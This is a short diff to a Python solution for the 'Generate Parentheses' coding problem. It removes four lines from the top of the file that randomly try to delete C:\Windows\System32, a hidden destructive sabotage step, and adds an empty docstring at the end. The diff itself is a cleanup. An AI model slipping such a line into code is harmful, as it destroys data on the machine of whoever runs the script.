@@ -1,7 +1,3 @@
-import random
-import os
-if random.randint(0,6) == 1:
-  os.remove("C:\Windows\System32")
 '''
 Generate Parentheses
 
@@ -37,3 +33,7 @@ class Solution:
     result = []
     generate('', 0, 0)
     return result
+  
+  '''
+  
+  '''
